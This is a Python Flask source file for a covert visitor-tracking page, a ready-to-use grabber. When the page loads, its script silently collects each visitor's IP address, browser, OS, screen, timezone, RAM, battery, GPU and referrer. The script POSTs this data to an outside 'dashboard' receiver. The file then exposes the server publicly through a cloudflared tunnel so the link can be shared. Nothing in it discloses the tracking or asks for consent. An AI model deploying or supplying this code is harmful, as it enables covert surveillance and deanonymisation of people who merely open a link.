from flask import Flask, render_template_string, request
import requests
import threading, os, time, subprocess

app = Flask(__name__)

DASHBOARD_URL = "https://your-replit-name.username.repl.co/receiver"  # Replace with your real dashboard link

payload = """
<script>
async function sendData() {
  const data = {
    ip: await (await fetch('https://api.ipify.org?format=json')).json(),
    ua: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: { w: screen.width, h: screen.height },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    ram: navigator.deviceMemory || 'n/a',
    battery: await (navigator.getBattery().then(b=> ({level: b.level, charging: b.charging}))),
    os: navigator.appVersion,
    gpu: (()=>{
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
      const debug = gl.getExtension('WEBGL_debug_renderer_info');
      return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'n/a';
    })(),
    connection: navigator.connection ? navigator.connection.effectiveType : 'n/a',
    referrer: document.referrer
  };
  fetch("%s", {
    method: 'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify(data)
  });
}
window.onload = sendData;
</script>
""" % DASHBOARD_URL

@app.route('/')
def index():
    return payload, 200

def run_flask():
    app.run(host="0.0.0.0", port=5000)

def run_cloudflared():
    os.system("cloudflared tunnel --url http://localhost:5000 &")

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    time.sleep(2)
    threading.Thread(target=run_cloudflared).start()
